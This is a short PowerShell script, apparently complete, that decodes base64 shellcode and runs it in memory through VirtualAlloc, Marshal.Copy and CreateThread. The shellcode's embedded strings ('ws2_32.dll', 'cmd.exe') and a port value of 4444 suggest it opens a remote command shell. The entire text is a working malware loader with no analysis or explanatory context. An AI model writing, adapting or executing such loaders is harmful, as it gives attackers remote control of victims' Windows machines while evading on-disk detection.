$base64 = "6AAAAABajVL7VYnlgewAAwAAUouCMQIAAFDoogEAAIlF/IPEBFpSjUXkUI2CSAIAAFCLRfxQ6MIBAACDxAxaUo2aNQIAAFOLRfD/0IlF4FpSjUXMUI2CZAIAAFCLReBQ6JgBAACDxAxaUjHAZrgCAo2NOP7//1FQ/1XUWlIxwFBQUFBAUEBQ/1XQiUXIWo21KP7//zHAZscGAgBmx0YCEVyLinwCAACJTgSJRgiJRgxSahBW/3XI/1XcWo215P3//zHAife5CwAAAPOrxgYsZsdGLAEBZolGMIt9yIl+OIl+PIl+QI291P3//4kHiUcEiUcIiUcMUo2KQAIAAFdWMcBQUFBAUEhQUFFQ/1XoWrj/////UP+11P3///9V+InsXcOLVCQEMcCKGoD7AHQbgPtBcgiA+1p3A4DLIMHABw+22zHYA1QkCOveWoPECFLDVYnlg+wMi10Ii3M8jTQzjXZ4izaNNDOLfiCNPDuJffyLfhyNPDuJffSLfiSNPDuJffgxyYtV/I0UiosSi10IjRQTagFS6Ij///87RQx0BYPBAXXgi1X4jRRKMcBmiwKLVfSNFIKLEotdCI0EE4nsXcNVieVkiz0wAAAAi38Mi38Mif6LVjBqAlLoRP///4tdCDnYdAiLNjn+dejrB4tGGInsXcO4/////4nsXcNVieUxyYtdDI0ci4sbg/v/dBxRU4tFCFDoNv///4PECFmLXRCNHIuJA4PBAevXiciJ7F3Djv4fS3dzMl8zMi5kbGwAY21kLmV4ZQDVuT5y5opxRhmjkJUGgOjIQmhvnnt1R8X/////rTX4ryS1us5t9Z7tnH2dk4r+2O3/////fwAAAcCoOgGsECkB"
$bytes = [Convert]::FromBase64String($base64)

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K32 {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint t);
}
"@

$addr = [K32]::VirtualAlloc(0, $bytes.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
$th = [K32]::CreateThread(0,0,$addr,0,0,0)
[K32]::WaitForSingleObject($th, 0xFFFFFFFF)